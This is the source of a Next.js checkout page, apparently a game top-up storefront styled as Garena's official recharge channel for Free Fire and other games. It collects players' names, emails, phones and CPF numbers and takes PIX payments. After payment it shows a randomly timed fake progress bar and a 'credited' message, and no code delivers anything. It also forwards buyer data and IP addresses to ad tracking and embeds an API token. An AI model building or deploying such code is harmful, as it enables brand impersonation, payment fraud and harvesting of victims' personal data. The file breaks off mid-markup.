"use client"

import React, { useState, useEffect } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { ArrowLeft } from "lucide-react"
import Toast from "../../components/toast"
import { useUtmParams } from "@/hooks/useUtmParams"
import QRCode from "qrcode"

export default function CheckoutPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const { utmParams } = useUtmParams()

  const [playerName, setPlayerName] = useState("")
  const [playerNickname, setPlayerNickname] = useState("")
  const [processingProgress, setProcessingProgress] = useState(0)
  const [fullName, setFullName] = useState("")
  const [email, setEmail] = useState("")
  const [phone, setPhone] = useState("")
  const [cpf, setCpf] = useState("")
  const [utmParameters, setUtmParameters] = useState<Record<string, string>>({})
  const [isProcessingPayment, setIsProcessingPayment] = useState(false)
  const [showToast, setShowToast] = useState(false)
  const [toastMessage, setToastMessage] = useState("")
  const [toastType, setToastType] = useState<"success" | "error" | "info">("success")
  const [pixData, setPixData] = useState<{code: string, qrCode: string, transactionId: string} | null>(null)
  const [showPixInline, setShowPixInline] = useState(false)
  const [pixError, setPixError] = useState("")
  const [isCopied, setIsCopied] = useState(false)
  const [qrCodeImage, setQrCodeImage] = useState("")
  const [timeLeft, setTimeLeft] = useState(15 * 60) // 15 minutos em segundos
  const [timerActive, setTimerActive] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid' | 'expired'>('pending')
  const [showPromoModal, setShowPromoModal] = useState(false)
  const [showWarningModal, setShowWarningModal] = useState(false)
  const [selectedPromos, setSelectedPromos] = useState<string[]>([])

  // Get URL parameters
  const itemType = searchParams.get("type") || searchParams.get("itemType") || "recharge"
  const itemValue = searchParams.get("value") || searchParams.get("itemValue") || "1.060"
  const itemBonus = searchParams.get("bonus") || "0"
  const playerId = searchParams.get("playerId") || ""
  const price = searchParams.get("price") || "14.24"
  const paymentMethod = searchParams.get("paymentMethod") || "PIX"
  const gameApp = searchParams.get("app") || "100067" // Detectar qual jogo
  
  // Determinar qual jogo baseado no app
  const currentGame = gameApp === "100157" ? "deltaforce" : gameApp === "haikyu" ? "haikyu" : "freefire"
  
  // Função para adicionar UTMs a qualquer URL interna
  const addUtmsToUrl = (url: string): string => {
    if (typeof window === 'undefined') return url
    
    const currentParams = new URLSearchParams(window.location.search)
    const urlObj = new URL(url, window.location.origin)
    
    // Adicionar todos os parâmetros atuais à nova URL
    currentParams.forEach((value, key) => {
      if (!urlObj.searchParams.has(key)) {
        urlObj.searchParams.set(key, value)
      }
    })
    
    return urlObj.pathname + urlObj.search
  }
  
  // Configuração por jogo
  const gameConfig = {
    freefire: {
      banner: "/images/checkout-banner.webp",
      icon: "/images/icon.webp",
      coinIcon: "https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png",
      name: "Free Fire",
      coinName: "Diamantes",
      showOrderBump: true,
      showNickname: true
    },
    deltaforce: {
      banner: "/images/backgroundDelta.jpg",
      icon: "/images/iconeusuarioDeltaForce.png",
      coinIcon: "/images/IconeCoinsDF.png",
      name: "Delta Force",
      coinName: "Coins",
      showOrderBump: false,
      showNickname: false
    },
    haikyu: {
      banner: "/images/backgroundHiuki.jpg",
      icon: "/images/HAIKIU FLY HIGH.png",
      coinIcon: "/images/iconCoinHaikyu.png",
      name: "HAIKYU!! FLY HIGH",
      coinName: "Diamantes Estelares",
      showOrderBump: false,
      showNickname: false
    }
  }
  
  const config = gameConfig[currentGame as keyof typeof gameConfig]

  // Bloquear scroll do background quando modais estão abertos
  useEffect(() => {
    if (showPromoModal || showWarningModal) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = 'unset'
    }
    
    return () => {
      document.body.style.overflow = 'unset'
    }
  }, [showPromoModal, showWarningModal])

  useEffect(() => {
    setPlayerName(playerId)
    
    // Buscar nickname do jogador do localStorage
    const storedUserData = localStorage.getItem('userData')
    if (storedUserData) {
      try {
        const userData = JSON.parse(storedUserData)
        if (userData.nickname) {
          setPlayerNickname(userData.nickname)
        }
      } catch (error) {
        // Erro ao recuperar nickname
      }
    }
    
    // Capturar parâmetros UTM da URL atual e do sessionStorage
    const urlParams = new URLSearchParams(window.location.search)
    const utmData: Record<string, string> = {}
    
    // Lista de parâmetros para capturar
    const paramsToCapture = [
      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
      'gclid', 'fbclid', 'src', 'sck', 'xcod', 'keyword', 'device', 'network', 
      'gad_source', 'gbraid', 'wbraid', 'msclkid'
    ]
    
    // 1. Capturar da URL atual
    paramsToCapture.forEach(param => {
      const value = urlParams.get(param)
      if (value) {
        utmData[param] = value
      }
    })
    
    // 2. Capturar do sessionStorage (persistência entre páginas)
    paramsToCapture.forEach(param => {
      if (!utmData[param]) {
        const storedValue = sessionStorage.getItem(`utm_${param}`)
        if (storedValue) {
          utmData[param] = storedValue
        }
      }
    })
    
    // 3. Usar parâmetros do hook como fallback
    Object.entries(utmParams).forEach(([key, value]) => {
      if (value && !utmData[key]) {
        utmData[key] = value
      }
    })
    // 4. Salvar no sessionStorage para próximas páginas
    Object.entries(utmData).forEach(([key, value]) => {
      sessionStorage.setItem(`utm_${key}`, value)
    })
    
    // 5. Adicionar timestamp e página atual
    utmData.timestamp = new Date().toISOString()
    utmData.current_page = 'checkout'
    
    // UTM Parameters capturados
    
    setUtmParameters(utmData)
  }, [playerId, utmParams])

  const showToastMessage = (message: string, type: "success" | "error" | "info") => {
    setToastMessage(message)
    setToastType(type)
    setShowToast(true)
  }

  const getFinalPrice = () => {
    return Number.parseFloat(price!)
  }


  const calculateDiamondDetails = (diamonds: string) => {
    const diamondCount = Number.parseInt(diamonds.replace(".", "").replace(",", ""))
    const bonusMap: { [key: number]: number } = {
      100: 20, 310: 62, 520: 104, 1060: 212, 2180: 436, 5600: 1120, 15600: 3120,
    }
    const bonus = bonusMap[diamondCount] || 0
    const total = diamondCount + bonus
    return { original: diamondCount, bonus, total }
  }

  const handleBack = () => {
    router.back()
  }

  const promoItems = [
    { id: 'sombra-roxa', name: 'Sombra Roxa', image: '/images/sombraRoxa.png', oldPrice: 99.75, price: 9.99 },
    { id: 'barba-velho', name: 'Barba do Velho', image: '/images/Barba do Velho.png', oldPrice: 89.99, price: 10.99 },
    { id: 'pacote-coelhao', name: 'Pacote Coelhão', image: '/images/Pacote Coelhão.png', oldPrice: 49.29, price: 9.99 },
    { id: 'calca-angelical', name: 'Calça Angelical Azul', image: '/images/Calça Angelical Azul.png', oldPrice: 129.90, price: 15.80 },
    { id: 'dunk-master', name: 'Dunk Master', image: '/images/Dunk Master.png', oldPrice: 75.90, price: 9.99 }
  ]

  const togglePromoItem = (itemId: string) => {
    setSelectedPromos(prev => 
      prev.includes(itemId) 
        ? prev.filter(id => id !== itemId)
        : [...prev, itemId]
    )
  }

  const getPromoTotal = () => {
    return selectedPromos.reduce((total, itemId) => {
      const item = promoItems.find(p => p.id === itemId)
      return total + (item?.price || 0)
    }, 0)
  }

  const handleProceedToPayment = async () => {
    if (isProcessingPayment) {
      return
    }

    if (!fullName.trim() || !email.trim() || !phone.trim() || !cpf.trim()) {
      alert("Por favor, preencha todos os campos obrigatórios.")
      return
    }

    if (!validateCpf(cpf)) {
      alert("Por favor, insira um CPF válido.")
      return
    }

    // Mostrar modal de promoção apenas para Free Fire
    if (config.showOrderBump) {
      setShowPromoModal(true)
      setShowWarningModal(true) // Mostrar aviso na frente
    } else {
      // Para Delta Force e Haikyu, ir direto para finalizar
      handleFinalizeOrder()
    }
  }

  const handleFinalizeOrder = async () => {
    setShowPromoModal(false)
    setIsProcessingPayment(true)
    setShowPixInline(true)
    setPixError("")
    
    try {
      // Calcular valor total com promoções
      const basePrice = getFinalPrice()
      const promoTotal = getPromoTotal()
      const totalPrice = basePrice + promoTotal
      
      // Gerar PIX
      const response = await fetch('/api/generate-pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: Math.round(totalPrice * 100),
          utmParams: utmParameters,
          playerId: playerId,
          itemType: itemType,
          itemValue: itemValue,
          paymentMethod: paymentMethod,
          customer: {
            name: fullName,
            email: email,
            phone: getPhoneNumbers(phone),
            document: {
              number: cpf.replace(/\D/g, ""),
              type: "cpf"
            }
          }
        })
      })

      if (response.ok) {
        const data = await response.json()
        
        // Gerar QR Code em base64
        let qrCodeImageData = ""
        try {
          const qrCodeDataURL = await QRCode.toDataURL(data.pixCode, {
            width: 150,
            margin: 1,
            color: {
              dark: '#000000',
              light: '#FFFFFF'
            },
            errorCorrectionLevel: 'M'
          })
          qrCodeImageData = qrCodeDataURL
        } catch (qrError) {
          // Erro silencioso no QR Code
          // Fallback: usar a imagem do servidor se disponível
          if (data.qrCode) {
            qrCodeImageData = data.qrCode
          }
        }
        
        setPixData({
          code: data.pixCode,
          qrCode: data.qrCode,
          transactionId: data.transactionId
        })
        
        setQrCodeImage(qrCodeImageData)
        
        // Iniciar timer de 15 minutos
        setTimeLeft(15 * 60)
        setTimerActive(true)
        
        // Enviar para UTMify com status pending
        await sendToUtmify('pending', data)
        
      } else {
        const errorData = await response.json().catch(() => ({}))
        const errorMessage = errorData.error || errorData.message || `Erro HTTP ${response.status}`
        setPixError(`Erro ao gerar PIX: ${errorMessage}`)
      }
    } catch (error) {
      setPixError('Erro ao gerar PIX. Tente novamente.')
    } finally {
      setIsProcessingPayment(false)
    }
  }

  const formatPrice = (priceStr: string) => {
    return `R$ ${Number.parseFloat(priceStr).toFixed(2).replace(".", ",")}`
  }

  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 11) {
      return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    }
    return value
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3")
    } else {
      return numbers.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    }
  }

  const getPhoneNumbers = (formattedPhone: string) => {
    return formattedPhone.replace(/\D/g, "")
  }

  const validateCpf = (cpf: string) => {
    const numbers = cpf.replace(/\D/g, "")
    if (numbers.length !== 11) return false
    
    if (/^(\d)\1{10}$/.test(numbers)) return false
    
    let sum = 0
    for (let i = 0; i < 9; i++) {
      sum += parseInt(numbers[i]) * (10 - i)
    }
    let digit1 = 11 - (sum % 11)
    if (digit1 > 9) digit1 = 0
    
    sum = 0
    for (let i = 0; i < 10; i++) {
      sum += parseInt(numbers[i]) * (11 - i)
    }
    let digit2 = 11 - (sum % 11)
    if (digit2 > 9) digit2 = 0
    
    return parseInt(numbers[9]) === digit1 && parseInt(numbers[10]) === digit2
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value)
    setCpf(formatted)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    setPhone(formatted)
  }

  // Timer de 15 minutos
  useEffect(() => {
    let interval: NodeJS.Timeout
    
    if (timerActive && timeLeft > 0) {
      interval = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            setTimerActive(false)
            setPaymentStatus('expired')
            return 0
          }
          return prev - 1
        })
      }, 1000)
    }
    
    return () => {
      if (interval) clearInterval(interval)
    }
  }, [timerActive, timeLeft])

  // Polling para verificar status do pagamento a cada 10 segundos
  useEffect(() => {
    let statusInterval: NodeJS.Timeout
    
    if (pixData && paymentStatus === 'pending' && timerActive) {
      statusInterval = setInterval(async () => {
        try {
          const response = await fetch('/api/check-transaction-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ transactionId: pixData.transactionId })
          })
          
          if (response.ok) {
            const data = await response.json()
            
            if (data.success && data.status === 'paid') {
              setPaymentStatus('paid')
              setTimerActive(false)
              
              // Mostrar mensagem de sucesso
              showToastMessage(`🎉 Pagamento confirmado! Seus ${config.coinName.toLowerCase()} serão creditados em breve.`, 'success')
              
              // Iniciar animação da barra de progresso (5-10 minutos)
              const randomMinutes = Math.floor(Math.random() * 6) + 5 // 5 a 10 minutos
              const totalDuration = randomMinutes * 60 * 1000 // Converter para milissegundos
              const intervalTime = totalDuration / 100 // Dividir em 100 steps
              
              let progress = 0
              const progressInterval = setInterval(() => {
                progress += 1
                setProcessingProgress(progress)
                if (progress >= 100) {
                  clearInterval(progressInterval)
                  // Mostrar alerta quando completar
                  showToastMessage('✅ Diamantes creditados! Aproveite o jogo!', 'success')
                }
              }, intervalTime)
              
              // Enviar para UTMify com status PAID
              await sendToUtmifyPaid(pixData.transactionId)
            }
          }
        } catch (error) {
          // Erro silencioso no polling
        }
      }, 10000) // Verificar a cada 10 segundos
    }
    
    return () => {
      if (statusInterval) clearInterval(statusInterval)
    }
  }, [pixData, paymentStatus, timerActive])


  // Formatar tempo para exibição (MM:SS)
  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`
  }

  // Função auxiliar para calcular comissão BlackCat
  const calculateCommission = (totalPriceInCents: number) => {
    const FEE_PERCENT = 0.0699      // 6.99%
    const FEE_FIXED = 200           // R$ 2,00
    
    const gatewayFeeInCents = Math.round(totalPriceInCents * FEE_PERCENT) + FEE_FIXED
    const userCommissionInCents = totalPriceInCents - gatewayFeeInCents
    
    return {
      totalPriceInCents,
      gatewayFeeInCents,
      userCommissionInCents
    }
  }

  // Função para capturar IP real do cliente
  const getClientIP = async (): Promise<string> => {
    try {
      const response = await fetch('https://ipinfo.io/?token=32090226b9d116')
      if (response.ok) {
        const data = await response.json()
        return data.ip
      }
    } catch (error) {
      // Erro ao capturar IP
    }
    return 'unknown'
  }

  // Função para enviar dados para UTMify (PENDING)
  const sendToUtmify = async (status: 'pending', transactionData: any) => {
    try {
      // Capturar IP real
      const clientIp = await getClientIP()
      
      // Calcular comissão real com orderbump
      const basePrice = getFinalPrice()
      const promoTotal = getPromoTotal()
      const totalPrice = basePrice + promoTotal
      const totalPriceInCents = Math.round(totalPrice * 100)
      const commission = calculateCommission(totalPriceInCents)
      
      // Criar produto único com valor total
      const products = [
        {
          id: `recarga-${transactionData.transactionId}`,
          name: itemType === "recharge" ? `Recarga Free Fire - ${itemValue} Diamantes` : itemValue,
          planId: null,
          planName: null,
          quantity: 1,
          priceInCents: totalPriceInCents
        }
      ]
      
      // Criar dados no formato do UTMify
      const utmifyData = {
        orderId: transactionData.transactionId,
        platform: "RecarGames",
        paymentMethod: "pix",
        status: "waiting_payment",
        createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
        approvedDate: null,
        refundedAt: null,
        customer: {
          name: fullName,
          email: email,
          phone: getPhoneNumbers(phone),
          document: cpf.replace(/\D/g, ""),
          country: "BR",
          ip: clientIp
        },
        products: products,
        trackingParameters: {
          src: utmParameters.src || null,
          sck: utmParameters.sck || null,
          utm_source: utmParameters.utm_source || null,
          utm_campaign: utmParameters.utm_campaign || null,
          utm_medium: utmParameters.utm_medium || null,
          utm_content: utmParameters.utm_content || null,
          utm_term: utmParameters.utm_term || null,
          gclid: utmParameters.gclid || null,
          xcod: utmParameters.xcod || null,
          keyword: utmParameters.keyword || null,
          device: utmParameters.device || null,
          network: utmParameters.network || null,
          gad_source: utmParameters.gad_source || null,
          gbraid: utmParameters.gbraid || null,
        },
        commission: commission,
        isTest: process.env.NEXT_PUBLIC_UTMIFY_TEST_MODE === 'true'
      }

      const response = await fetch('/api/utmify-track', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(utmifyData)
      })
      
      if (!response.ok) {
        // Erro ao enviar PENDING
      }
    } catch (error) {
      // Erro de conexão
    }
  }

  // Função para enviar dados para UTMify (PAID)
  const sendToUtmifyPaid = async (transactionId: string) => {
    try {
      // Capturar IP real
      const clientIp = await getClientIP()
      
      // Calcular comissão real com orderbump
      const basePrice = getFinalPrice()
      const promoTotal = getPromoTotal()
      const totalPrice = basePrice + promoTotal
      const totalPriceInCents = Math.round(totalPrice * 100)
      const commission = calculateCommission(totalPriceInCents)
      
      // Criar produto único com valor total
      const products = [
        {
          id: `recarga-${transactionId}`,
          name: itemType === "recharge" ? `Recarga Free Fire - ${itemValue} Diamantes` : itemValue,
          planId: null,
          planName: null,
          quantity: 1,
          priceInCents: totalPriceInCents
        }
      ]
      
      // Criar dados no formato do UTMify
      const utmifyData = {
        orderId: transactionId,
        platform: "RecarGames",
        paymentMethod: "pix",
        status: "paid",
        createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
        approvedDate: new Date().toISOString().replace('T', ' ').substring(0, 19),
        refundedAt: null,
        customer: {
          name: fullName,
          email: email,
          phone: getPhoneNumbers(phone),
          document: cpf.replace(/\D/g, ""),
          country: "BR",
          ip: clientIp
        },
        products: products,
        trackingParameters: {
          src: utmParameters.src || null,
          sck: utmParameters.sck || null,
          utm_source: utmParameters.utm_source || null,
          utm_campaign: utmParameters.utm_campaign || null,
          utm_medium: utmParameters.utm_medium || null,
          utm_content: utmParameters.utm_content || null,
          utm_term: utmParameters.utm_term || null,
          gclid: utmParameters.gclid || null,
          xcod: utmParameters.xcod || null,
          keyword: utmParameters.keyword || null,
          device: utmParameters.device || null,
          network: utmParameters.network || null,
          gad_source: utmParameters.gad_source || null,
          gbraid: utmParameters.gbraid || null
        },
        commission: commission,
        isTest: process.env.NEXT_PUBLIC_UTMIFY_TEST_MODE === 'true'
      }

      const response = await fetch('/api/utmify-track', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(utmifyData)
      })
      
      if (!response.ok) {
        // Erro ao enviar PAID
      }
    } catch (error) {
      // Erro de conexão
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">

      <div className="bg-white border-b border-gray-200 p-3 sm:p-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="w-8 h-8 sm:w-10 sm:h-10">
              <img src="/images/garena-logo.png" alt="Garena Logo" className="w-full h-full object-contain" />
            </div>
            <div>
              <h1 className="font-bold text-base sm:text-lg text-gray-800">Canal Oficial de</h1>
              <p className="text-xs sm:text-sm text-gray-600">Recarga</p>
            </div>
          </div>
        </div>
      </div>

      {/* Background Banner */}
      <div className="relative w-full" style={{ height: '180px' }}>
        <img 
          src={config.banner} 
          alt={`${config.name} Banner`} 
          className="w-full h-banner-custom object-cover"
        />
        
        <button
          onClick={handleBack}
          className="absolute top-3 left-3 sm:top-4 sm:left-4 bg-black bg-opacity-50 text-white p-2 rounded-full hover:bg-opacity-70 transition-all z-10"
        >
          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
      </div>

      {/* Ícone e Título */}
      <div className="relative flex flex-col items-center bg-white" style={{ marginTop: '-32px' }}>
        <div className="w-16-custom h-16-custom mb-3 relative" style={{
          border: '1px solid white',
          borderRadius: '15px',
          padding: '4px',
          backgroundColor: 'white',
          marginTop: '-110px',
          width: '70px',

        }}>
          <img src={config.icon} alt={`${config.name} Icon`} className="w-full h-full object-contain" style={{ borderRadius: '8px' }} />
        </div>
        <h2 className="text-xl sm:text-2xl font-bold text-gray-800 whitespace-pre-line text-center">{config.name}</h2>
        <div className="h-4"></div>
      </div>

      <div className="max-w-2xl mx-auto px-3 sm:px-4 pb-4 sm:pb-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 mb-4 sm:mb-6">
          <dl className="mb-3 grid grid-cols-2 justify-between gap-x-3.5 px-4 md:mb-4 md:px-10">
            {/* Produto Selecionado */}
            <dt className="col-span-2 py-3 text-sm/none text-gray-800 md:text-base/none">
              Produto Selecionado: <span className="font-bold">{itemType === "recharge" ? `${itemValue} ${config.coinName}` : itemValue}</span>
            </dt>
            
            {/* Informação sobre os diamantes/coins */}
            {itemType === "recharge" && (
              <div className="col-span-2 mb-1 text-xs/normal text-gray-500 md:text-sm/normal">
                Os {config.coinName.toLowerCase()} são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.
              </div>
            )}
            
            {/* Total e Bônus para Recharge */}
            {itemType === "recharge" && (
              <>
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Total {config.coinName}</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                  <img
                    src={config.coinIcon}
                    alt={config.coinName}
                    className="w-4 h-4"
                  />
                  {itemValue?.replace(/\./g, '').replace(/,/g, '')}
                </dd>
                
                {parseInt(itemBonus) > 0 && (
                  <>
                    <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Bônus</dt>
                    <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-red-600 md:text-base/none">
                      <img
                        src={config.coinIcon}
                        alt={config.coinName}
                        className="w-4 h-4"
                      />
                      +{parseInt(itemBonus).toLocaleString()}
                    </dd>
                  </>
                )}
              </>
            )}
            
            {/* Bônus para Ofertas Especiais */}
            {itemType === "special" && parseInt(itemBonus) > 0 && (
              <>
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Bônus {config.coinName}</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-red-600 md:text-base/none">
                  <img
                    src={config.coinIcon}
                    alt={config.coinName}
                    className="w-4 h-4"
                  />
                  +{parseInt(itemBonus).toLocaleString()}
                </dd>
              </>
            )}
            
            {/* Itens do Orderbump */}
            {selectedPromos.length > 0 && (
              <>
                <dt className="col-span-2 py-3 text-sm/none font-semibold text-gray-800 md:text-base/none border-t pt-4">
                  Itens Adicionais:
                </dt>
                {selectedPromos.map(promoId => {
                  const item = promoItems.find(p => p.id === promoId)
                  return item ? (
                    <React.Fragment key={promoId}>
                      <dt className="py-2 text-sm/none text-gray-600 md:text-base/none">
                        <div className="flex items-center gap-2">
                          <img src={item.image} alt={item.name} className="w-8 h-8 rounded object-cover" />
                          {item.name}
                        </div>
                      </dt>
                      <dd className="flex items-center justify-end gap-1 py-2 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                        {formatPrice(item.price.toString())}
                      </dd>
                    </React.Fragment>
                  ) : null
                })}
              </>
            )}
            
            {/* Preço Total */}
            <dt className="py-3 text-sm/none text-gray-600 md:text-base/none border-t font-semibold">Total</dt>
            <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-bold text-gray-800 md:text-base/none border-t">
              {formatPrice((getFinalPrice() + getPromoTotal()).toString())}
            </dd>
            
            {/* Método de pagamento */}
            <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Método de pagamento</dt>
            <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
              PIX
            </dd>
            
            {/* Nome do Jogador */}
            <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Nome do Jogador</dt>
            <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
              {config.showNickname ? (playerNickname || playerId || 'N/A') : (playerId || 'N/A')}
            </dd>
          </dl>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          {!pixData ? (
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Nome Completo *</label>
                <input
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  disabled={isProcessingPayment}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
                  placeholder="Digite seu nome completo"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email *</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  disabled={isProcessingPayment}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
                  placeholder="seu@email.com"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Telefone *</label>
                <input
                  type="tel"
                  value={phone}
                  onChange={handlePhoneChange}
                  disabled={isProcessingPayment}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
                  placeholder="(11) 99999-9999"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">CPF *</label>
                <input
                  type="text"
                  value={cpf}
                  onChange={handleCpfChange}
                  disabled={isProcessingPayment}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
                  placeholder="000.000.000-00"
                />
                {cpf && !validateCpf(cpf) && (
                  <p className="text-red-500 text-xs mt-1">CPF inválido</p>
                )}
              </div>
            </div>
          ) : (
            <div className="flex w-full flex-col">
              {pixError ? (
                <div className="text-center py-6">
                  <p className="text-red-600 mb-4">{pixError}</p>
                  <button
                    onClick={() => {
                      setShowPixInline(false)
                      setPixError("")
                      setPixData(null)
                    }}
                    className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg transition-colors"
                  >
                    Tentar novamente
                  </button>
                </div>
              ) : pixData ? (
                <>
                  {paymentStatus === 'paid' ? (
                    /* Pagamento Confirmado - Layout com Fila */
                    <>
                      <div className="mb-6 p-6">
                        <div className="flex flex-col items-center text-center">
                          <h3 className="text-1xl font-bold text-gray-500 mb-2">🎉 Pagamento Confirmado!</h3>
                          <p className="text-sm text-gray-600 mb-4">
                            Não se preocupe! Estamos com uma grande demanda no momento.
                          </p>
                          
                          {/* Barra de Progresso */}
                          <div className="w-full mb-4">
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-xs text-gray-600">Processando sua recarga...</span>
                              <span className="text-xs font-semibold text-red-600">{processingProgress}%</span>
                            </div>
                            <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                              <div 
                                className="bg-gradient-to-r from-red-400 to-red-600 h-3 rounded-full transition-all duration-500 ease-out relative overflow-hidden"
                                style={{ width: `${processingProgress}%` }}
                              >
                                <div className="absolute inset-0 bg-white/30 animate-pulse"></div>
                              </div>
                            </div>
                          </div>

                          <p className="text-xs text-gray-600 leading-relaxed">
                            Assim que a barra carregar completamente, {itemType === "recharge" ? `seus ${config.coinName.toLowerCase()} estarão na sua conta` : "seus itens estarão disponíveis"}! 🚀<br/>
                            Você pode jogar um pouco enquanto aguarda, te avisaremos por aqui quando estiver pronto. 🎮
                          </p>
                        </div>
                      </div>
                    </>
                  ) : (
                    /* Aguardando Pagamento - Layout Completo */
                    <>
                      {/* Título */}
                      <div className="text-center text-lg font-medium text-gray-800 mb-4">Pague com Pix</div>
                      
                      {/* QR Code */}
                      <div className="my-3 flex h-[150px] w-full items-center justify-center">
                        {qrCodeImage ? (
                          <img 
                            src={qrCodeImage} 
                            alt="QR Code Pix" 
                            width="150" 
                            height="150" 
                            className="rounded-lg"
                          />
                        ) : (
                          <div className="w-[150px] h-[150px] bg-gray-200 rounded-lg flex items-center justify-center">
                            <span className="text-gray-500 text-sm">Gerando QR Code...</span>
                          </div>
                        )}
                      </div>

                      {/* Informações da empresa */}
                      <div className="text-center text-gray-500 text-sm mb-4">
                        KAPTPAY TECNOLOGIA DE PAGAMENTOS<br/>
                        CNPJ: 62.912.988/0001-12
                      </div>

                      {/* Código PIX */}
                      <div className="mb-4 mt-3 select-all break-words rounded-md bg-gray-100 p-4 text-sm text-gray-800">
                        {pixData.code}
                      </div>

                      {/* Botão Copiar */}
                      <button
                        onClick={async () => {
                          try {
                            await navigator.clipboard.writeText(pixData.code)
                            setIsCopied(true)
                            setTimeout(() => setIsCopied(false), 2000)
                          } catch (error) {
                            // Fallback para dispositivos que não suportam clipboard API
                            const textArea = document.createElement('textarea')
                            textArea.value = pixData.code
                            document.body.appendChild(textArea)
                            textArea.select()
                            document.execCommand('copy')
                            document.body.removeChild(textArea)
                            setIsCopied(true)
                            setTimeout(() => setIsCopied(false), 2000)
                          }
                        }}
                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md transition-colors bg-red-500 text-white hover:bg-red-600 px-4 py-2 mb-6 h-11 text-base font-bold w-full"
                      >
                        {isCopied ? 'Copiado!' : 'Copiar Código'}
                      </button>

                      {/* Timer/Alerta */}
                      <div role="alert" className="relative rounded-lg border p-4 bg-blue-50 border-blue-200 text-left w-full mb-4">
                        <div className="flex items-start gap-3">
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4 text-blue-600">
                            <path d="M5 22h14"></path>
                            <path d="M5 2h14"></path>
                            <path d="M17 22v-4.172a2 2 0 0 0-.586-1.414L12 12l-4.414 4.414A2 2 0 0 0 7 17.828V22"></path>
                            <path d="M7 2v4.172a2 2 0 0 0 .586 1.414L12 12l4.414-4.414A2 2 0 0 0 17 6.172V2"></path>
                          </svg>
                          <div>
                            <h5 className="mb-1 font-medium leading-none tracking-tight text-blue-800">Aguardando pagamento</h5>
                            <div className="text-sm text-blue-700">
                              {timerActive ? (
                                <>Você tem <span className="font-bold text-red-600">{formatTime(timeLeft)}</span> para pagar. Após o pagamento, os {config.coinName.toLowerCase()} podem levar alguns minutos para serem creditados.</>
                              ) : timeLeft === 0 ? (
                                <span className="text-red-600 font-medium">Tempo expirado. Gere um novo PIX para continuar.</span>
                              ) : (
                                `Você tem tempo para pagar. Após o pagamento, os ${config.coinName.toLowerCase()} podem levar alguns minutos para serem creditados.`
